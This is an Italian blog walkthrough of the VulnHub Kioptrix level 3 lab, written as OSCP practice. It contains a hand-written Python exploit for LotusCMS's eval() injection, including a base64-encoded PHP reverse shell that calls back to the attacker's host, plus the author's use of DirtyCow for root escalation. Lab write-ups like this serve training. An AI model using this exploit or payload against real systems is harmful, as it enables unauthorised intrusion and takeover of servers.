---
layout: post
title: "Getting Root: Kioptrix livello 3"
exercise: https://www.vulnhub.com/entry/kioptrix-level-12-3,24/
level: SEMPLICE
promotion: 
modified: 
featured: false
category: [getting-root]
tags: [walkthrough, oscp, kioptrix, getting-root]
comments: true
share: true
---

Siamo al terzo livello delle macchine della serie Kioptrix. Anche questa
macchina non presenta difficoltà degne di nota e credo sarà l'ultima macchina
semplice prima dell'OSCP.

Per rendere le cose più interessanti, ma anche per essere il più realista
possibile nei confronti dello scenario d'esame, non utilizzerò Metasploit. In
questo post, vedremo quindi come mi sono riscritto il mio exploit da solo.
Occasione, tra l'altro, per approfondire un po' di Python.

## Kioptrix Livello 3

Il livello 3 è disponibile a [questa pagina]({{page.exercise}}) del sito
[vulnhub.com](https://www.vulnhub.com).

Anche questa macchina virtuale è un box Linux su cui è montata una
distribuzione Ubuntu obsoleta.

### Setup dell'ambiente

La configurazione della mia piccola rete locale in 
[VirtualBox](https://www.virtualbox.org), tra la mia [Kali
Linux](https://www.kali.org) e la macchina target, è rimasta la stessa.
Entrambe non possono ragiungere il mondo esterno.

![La nostra vittima all'avvio]({{site.url}}/assets/images/getting-root/k3/vm_started.png)

Ora che tutte le macchine, all'avvio, prenderanno un indirizzo sulla 192.168.56
possiamo partire.

Per scoprire l'indirizzo assegnato a knoptrix3.com, utilizziamo nmap.

{% highlight sh%}
# nmap -sn 192.168.56.101-255
{% endhighlight%}

![La nostra vittima in rete]({{site.url}}/assets/images/getting-root/k3/0_target_discovery.png)

La macchina 192.168.56.101 è una Kali Linux aggiornata e pronta all'uso.
La macchina 192.168.56.104 è il nostro target. Come da note, scritte
dall'autore dell'esercizio, aggiungiamo una entry nel nostro file hosts,
affinche il dominio knoptrix3.com venga risolto con l'indirizzo corretto.

![/etc/hosts]({{site.url}}/assets/images/getting-root/k3/1_2_change_etc_hosts.png)

### Recon

Il primo passaggio è quello di enumerare i servizi in ascolto sulla macchina,
per cercare di capire qualcosa in più.

{%highlight sh%}
# nmap -sV -O 192.168.56.104 -oA 192.168.56.104
{%endhighlight%}

{% highlight sh %}
# Nmap 7.50 scan initiated Wed Sep 13 08:10:27 2017 as: nmap -sV -O -oA 192.168.56.104 192.168.56.104
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.104
Host is up (0.00024s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
MAC Address: 08:00:27:98:C2:4F (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep 13 08:10:37 2017 -- 1 IP address (1 host up) scanned in 9.95 seconds
{%endhighlight%}

### Takeover narrative

Essendo la versione di OpenSSH priva di exploit noti, mi dedico a quello che
trovo sulla porta 80. Navigandoci, abbiamo un sito web abbastanza anonimo con
una voce Login, nel menù.


![Home page del sito]({{site.url}}/assets/images/getting-root/k3/1_3_webapp_homepage.png)

Navigando sulla pagina di login, ottengo come informazione aggiuntiva, il nome
del CMS utilizzato: LotusCMS.

![Home page del sito]({{site.url}}/assets/images/getting-root/k3/1_4_lotusCMS_admin_page.png)

Faccio un po' di ricogniziona standard, quando si parla di porta 80, usando _dirb_ e _nikto.

{% highlight sh %}
# dirb http://kioptrix3.com -o 192.168.56.104.dirb
...
# nikto -host http://kioptrix3.com -Format txt -o 192.168.56.104.nikto
{% endhighlight %}

Analizzando l'output, scopriamo che il sito offre:

* un phpmyadmin 2.11.3 ![phpMyAdmin]({{site.url}}/assets/images/getting-root/k3/1_6_phpmyadmin_found.png)
* una gallery http://kioptrix3.com/gallery/index.php creata con gallaryfic ![Gallarific]({{site.url}}/assets/images/getting-root/k3/1_7_thegallery.png)
* una versione del sito in /cache ![Versione cache del sito]({{site.url}}/assets/images/getting-root/k3/1_8_a_cached_version_of_website.png)

Sia la versione di phpMyAdmin, che gallaryfic hanno exploit noti.

![Exploit per phpMyAdmin]({{site.url}}/assets/images/getting-root/k3/1_10_phpmyadmin_exploits.png)

![Exploit per Gallaryfic]({{site.url}}/assets/images/getting-root/k3/1_9_gallarific_exploits.png)

Voglio però, dedicarmi a LotusCMS, che mi offre sul piatto una _remote code
execution_, con tanto di modulo per Metasploit.

![Exploit per LotusCMS]({{site.url}}/assets/images/getting-root/k3/1_5_lotuscms_exploits.png)

#### Scrittura di un semplice exploit per LotusCMS

Quella che sfrutterò non è la vulnerabilità
[CVE-2011-0518](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-0518)
che ho scoperto dopo, mentre scrivevo questo post. Magari si può modificare il
mio exploit per sfruttare entrambe.

Sebbene sia già presente, e funzionante, un modulo Metasploit ed un [exploit
fatto molto bene su
exploit-db.com](https://www.exploit-db.com/exploits/18565/), ho deciso di
provare a scrivere da zero il mio exploit per:

* imparare un po' di python
* replicare lo scenario d'esame per l'OSCP
* divertirmi un po'.

Leggendo il codice dell'exploit in ruby e vedendo un altro exploit in rete
scritto in python, il nocciolo della vulnerabilità risiete nella mancata
validazione dell'input fornito al parametro _page_ nella pagina index.php di un
sito sviluppato con LotusCMS.

Questo input, viene inserito come argomento di una chiamata ad _eval()_.

Quello che dobbiamo fare è inserire del codice PHP all'interno del parametro
vulnerabile, codice che verrà eseguito coi privilegi con cui gira Apache sulla
macchina vittima.

Come prima cosa, facciamo un test per verificare che il sito sia vulnerabile.
Per fare questo, passo come parametro una _print_ e verifico che la scritta sia
presente nella risposta del mio web server.

{% highlight python %}

uri="/index.php"
canary=urllib.urlencode({"page":"index');${print('THIS_IS_RANDOM_FOO')};#"})
r = requests.get("http://"+sys.argv[1] + uri + "?system=Admin&"+canary)

print(r.status_code, r.reason)
canary_position = r.text.find('THIS_IS_RANDOM_FOO')

if canary_position == -1:
    print sys.argv[1]+" is not vulnerable"
    sys.exit()

print sys.argv[1] + " is vulnerable. Sending payload"
{% endhighlight %}

La seconda parte dell'attacco è mandare il payload. Ho preso il codice di una
reverse shell che ho trovato in rete e modificato per l'OSCP. Per questo
exploit ho tolto il preambolo <?php e la stringa ?>, visto che tutto il payload
sarà già eseguito all'interno del contesto PHP del webserver.

![Codice per la reverse shell]({{site.url}}/assets/images/getting-root/k3/1_12_codice_reverse_shell.png)

La reverse shell dovrà essere codificata in base64 per poter essere trasmessa in un flusso HTTP.

{%highlight python%}
buf="c2V0X3RpbWVfbGltaXQgKDApOyAkaXAgPSAiMTkyLjE2OC41Ni4xMDEiOyAkcG9ydCA9IDQ0MzsgJGNodW5rX3NpemUgPSAxNDAwOyAkd3JpdGVfYSA9IG51bGw7ICRlcnJvcl9hID0gbnVsbDsgJHNoZWxsID0gInVuYW1lIC1hOyB3OyBpZDsgL2Jpbi9zaCAtaSI7ICRkYWVtb24gPSAwOyAkZGVidWcgPSAwOyBpZiAoZnVuY3Rpb25fZXhpc3RzKCdwY250bF9mb3JrJykpIHsgJHBpZCA9IHBjbnRsX2ZvcmsoKTsgaWYgKCRwaWQgPT0gLTEpIHsgcHJpbnRpdCgiRVJST1I6IENhbid0IGZvcmsiKTsgZXhpdCgxKTsgfSBpZiAoJHBpZCkgeyBleGl0KDApOyB9IGlmIChwb3NpeF9zZXRzaWQoKSA9PSAtMSkgeyBwcmludGl0KCJFcnJvcjogQ2FuJ3Qgc2V0c2lkKCkiKTsgZXhpdCgxKTsgfSAkZGFlbW9uID0gMTsgfSBlbHNlIHsgcHJpbnRpdCgiV0FSTklORzogRmFpbGVkIHRvIGRhZW1vbmlzZS4gIFRoaXMgaXMgcXVpdGUgY29tbW9uIGFuZCBub3QgZmF0YWwuIik7IH0gY2hkaXIoIi8iKTsgdW1hc2soMCk7ICRzb2NrID0gZnNvY2tvcGVuKCRpcCwgJHBvcnQsICRlcnJubywgJGVycnN0ciwgMzApOyBpZiAoISRzb2NrKSB7IHByaW50aXQoIiRlcnJzdHIgKCRlcnJubykiKTsgZXhpdCgxKTsgfSAkZGVzY3JpcHRvcnNwZWMgPSBhcnJheSggMCA9PiBhcnJheSgicGlwZSIsICJyIiksIDEgPT4gYXJyYXkoInBpcGUiLCAidyIpLCAyID0+IGFycmF5KCJwaXBlIiwgInciKSk7ICRwcm9jZXNzID0gcHJvY19vcGVuKCRzaGVsbCwgJGRlc2NyaXB0b3JzcGVjLCAkcGlwZXMpOyBpZiAoIWlzX3Jlc291cmNlKCRwcm9jZXNzKSkgeyBwcmludGl0KCJFUlJPUjogQ2FuJ3Qgc3Bhd24gc2hlbGwiKTsgZXhpdCgxKTsgfSBzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBlc1swXSwgMCk7IHN0cmVhbV9zZXRfYmxvY2tpbmcoJHBpcGVzWzFdLCAwKTsgc3RyZWFtX3NldF9ibG9ja2luZygkcGlwZXNbMl0sIDApOyBzdHJlYW1fc2V0X2Jsb2NraW5nKCRzb2NrLCAwKTsgcHJpbnRpdCgiU3VjY2Vzc2Z1bGx5IG9wZW5lZCByZXZlcnNlIHNoZWxsIHRvICRpcDokcG9ydCIpOyB3aGlsZSAoMSkgeyBpZiAoZmVvZigkc29jaykpIHsgcHJpbnRpdCgiRVJST1I6IFNoZWxsIGNvbm5lY3Rpb24gdGVybWluYXRlZCIpOyBicmVhazsgfSBpZiAoZmVvZigkcGlwZXNbMV0pKSB7IHByaW50aXQoIkVSUk9SOiBTaGVsbCBwcm9jZXNzIHRlcm1pbmF0ZWQiKTsgYnJlYWs7IH0gJHJlYWRfYSA9IGFycmF5KCRzb2NrLCAkcGlwZXNbMV0sICRwaXBlc1syXSk7ICRudW1fY2hhbmdlZF9zb2NrZXRzID0gc3RyZWFtX3NlbGVjdCgkcmVhZF9hLCAkd3JpdGVfYSwgJGVycm9yX2EsIG51bGwpOyBpZiAoaW5fYXJyYXkoJHNvY2ssICRyZWFkX2EpKSB7IGlmICgkZGVidWcpIHByaW50aXQoIlNPQ0sgUkVBRCIpOyAkaW5wdXQgPSBmcmVhZCgkc29jaywgJGNodW5rX3NpemUpOyBpZiAoJGRlYnVnKSBwcmludGl0KCJTT0NLOiAkaW5wdXQiKTsgZndyaXRlKCRwaXBlc1swXSwgJGlucHV0KTsgfSBpZiAoaW5fYXJyYXkoJHBpcGVzWzFdLCAkcmVhZF9hKSkgeyBpZiAoJGRlYnVnKSBwcmludGl0KCJTVERPVVQgUkVBRCIpOyAkaW5wdXQgPSBmcmVhZCgkcGlwZXNbMV0sICRjaHVua19zaXplKTsgaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU1RET1VUOiAkaW5wdXQiKTsgZndyaXRlKCRzb2NrLCAkaW5wdXQpOyB9IGlmIChpbl9hcnJheSgkcGlwZXNbMl0sICRyZWFkX2EpKSB7IGlmICgkZGVidWcpIHByaW50aXQoIlNUREVSUiBSRUFEIik7ICRpbnB1dCA9IGZyZWFkKCRwaXBlc1syXSwgJGNodW5rX3NpemUpOyBpZiAoJGRlYnVnKSBwcmludGl0KCJTVERFUlI6ICRpbnB1dCIpOyBmd3JpdGUoJHNvY2ssICRpbnB1dCk7IH0gfSBmY2xvc2UoJHNvY2spOyBmY2xvc2UoJHBpcGVzWzBdKTsgZmNsb3NlKCRwaXBlc1sxXSk7IGZjbG9zZSgkcGlwZXNbMl0pOyBwcm9jX2Nsb3NlKCRwcm9jZXNzKTsgZnVuY3Rpb24gcHJpbnRpdCAoJHN0cmluZykgeyBpZiAoISRkYWVtb24pIHsgcHJpbnQgIiRzdHJpbmdcbiI7IH0gfQo" 

shellcode=urllib.urlencode({"page":"index');${eval(base64_decode('"+buf+"'))};#"})
r = requests.get("http://"+sys.argv[1] + uri +"?system=Admin&" + shellcode)
print(r.status_code, r.reason)
print r.text
{%endhighlight%}

Il codice dell'exploit è disponibile su
[github.com](https://gist.github.com/thesp0nge/420e87800882d4b2771743b52f49d60f).
Sentitevi liberi di migliorarlo e creare delle pull request.

In un'altra finestra ho lanciato netcat in ascolto sulla porta 443 e lanciato
il mio exploit, ottengo una shell non privilegiata.

![Lancio il mio exploit]({{site.url}}/assets/images/getting-root/k3/1_14_sending_exploit_lotus.png)

![Shell non privilegiata]({{site.url}}/assets/images/getting-root/k3/1_15_unprivileged_shell.png)


Da dentro la macchina, inizio a recuperare un po' di informazioni sulla
versione della distribuzione, sui processi in esecuzione e sulla versione del
kernel. Questo per cercare il giusto exploit.

![uname -a]]({{site.url}}/assets/images/getting-root/k3/1_16_info_gathering.png)

Navigando prima nelle directory in /home, praticamente tutte hanno il permesso
di lettura per tutti, noto il file /home/loneferret/CompanyPolicy.README. Una
nota del CEO che invita a fare 'sudo ht'. Sul nostro utente non ha effetti,
mentre l'utente loneferret, con il comando sudo ht è in grado di
impersonificare un
utente amministrativo (dalla bash_history e dal .sudo_as_admin_successful)

![Lettera dal CEO]({{site.url}}/assets/images/getting-root/k3/1_17_info_gathering_2.png)

Decido di usare [DirtyCow](https://dirtycow.ninja/) per elevare i miei
privilegi. Carico l'exploit con wget, usando la mia macchina Kali e lo compilo.

![Compilo dirtycow]({{site.url}}/assets/images/getting-root/k3/1_20_compiling_dirtycow.png)

Provo a loggarmi via ssh con l'utente _firefart_ ed ho conferma che l'exploit
ha funzionato come mi aspettavo. Sono root su 192.168.56.104.

![Root]({{site.url}}/assets/images/getting-root/k3/1_21_root.png)

La flag è nella /root ed è un messaggio dell'autore della macchina, [Steven
'loneferret' McElrea](http://www.kioptrix.com/blog/farewell-loneferret/) morto
lo scorso mese di agosto.

![Flag]({{site.url}}/assets/images/getting-root/k3/1_21_congrats_message.png)

## Off by one

Grazie [Steven](https://twitter.com/loneferret?lang=en), per Kioptrix e per
tutto il pesce.

Enjoy it!

